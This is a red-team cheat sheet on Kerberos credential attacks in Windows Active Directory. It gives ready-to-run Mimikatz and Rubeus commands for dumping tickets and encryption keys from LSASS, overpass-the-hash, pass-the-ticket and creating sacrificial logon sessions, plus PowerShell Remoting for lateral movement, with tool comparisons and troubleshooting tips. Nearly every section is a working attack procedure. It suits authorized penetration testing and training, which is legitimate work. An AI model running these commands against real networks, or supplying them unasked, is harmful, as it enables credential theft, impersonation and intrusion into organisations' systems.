## Harvesting Kerberos Tickets

Local administrator access is obtained on a Windows host and active user tickets must be collected for lateral movement. Non-administrative users can only harvest their own tickets.

Export all tickets from LSASS to disk as .kirbi files

```
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
```

Dump all tickets from the current session and encode them as Base64 strings

```
Rubeus.exe dump /nowrap
```

- Tool comparison
    
    - Mimikatz -> `sekurlsa::tickets /export` -> Writes individual `.kirbi` files to the current directory
    - Rubeus -> `dump /nowrap` -> Outputs tickets directly to the terminal as Base64
- Edge cases
    
    - Tickets ending with **$** are computer accounts required for AD interaction.
    - Tickets with the service **krbtgt** are TGTs for that specific account.
- Gotchas
    
    - **Local administrator** rights are required to harvest tickets from users other than the current session.
    - **Wrong encryption** errors (des_cbc_md4) may occur in Mimikatz 2.2.0 on specific Windows 10 versions during export.

## OverPass the Hash

A user's NTLM or AES hash is known and must be converted into a Kerberos TGT to move laterally.

Extract all Kerberos encryption keys from LSASS

```
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

Spawn a new process as a target user using an NTLM hash

```
mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:<DOMAIN> /user:<USERNAME> /ntlm:<HASH>" exit
```

Request a TGT from the KDC using an AES256 key and inject it into the session

```
Rubeus.exe asktgt /domain:<DOMAIN> /user:<USERNAME> /aes256:<HASH> /nowrap /ptt
```

- Tool comparison
    
    - Mimikatz -> `sekurlsa::pth` -> Requires **local administrator** privileges and spawns a new `cmd.exe`
    - Rubeus -> `asktgt` -> Does **not** require administrative rights and can import the ticket directly into the current session
- Gotchas
    
    - **Encryption downgrade** detection may trigger if an RC4 (NTLM) hash is used in domains with a functional level of 2008 or higher.

## Pass the Ticket (PtT)

A valid Kerberos ticket (.kirbi file or Base64 string) is available and must be imported into the current logon session.

Import a .kirbi file into the current session

```
Rubeus.exe ptt /ticket:<FILE_PATH>
```

Import a Base64 encoded ticket into the current session

```
Rubeus.exe ptt /ticket:<BASE64_STRING>
```

Inject a .kirbi file using Mimikatz

```
mimikatz.exe "privilege::debug" "kerberos::ptt <FILE_PATH>" exit
```

- Tool comparison
    - Rubeus -> `ptt /ticket:` -> Supports both file paths and Base64 strings
    - Mimikatz -> `kerberos::ptt` -> Standard method for importing `.kirbi` files

> ⚠️ Gap: The source does not specify the command to list currently imported tickets to verify success before attempting lateral movement.

## Sacrificial Logon Sessions

A TGT needs to be requested or imported without overwriting or purging the tickets of the current user context.

Create a hidden process with a random identity for ticket injection

```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

## Remote Session Execution via PtT

A Kerberos ticket for a user with remote management permissions has been imported and a shell on the target is required.

Connect to a remote host using PowerShell Remoting

```
Enter-PSSession -ComputerName <TARGET_IP>
```

Open a new command prompt with an imported ticket via Mimikatz

```
mimikatz.exe "misc::cmd" exit
```

- Gotchas
    - **Administrative permissions** or membership in **Remote Management Users** is required on the target host to establish a session.
    - **TCP/5985 (HTTP)** or **TCP/5986 (HTTPS)** must be open on the target for the connection to succeed.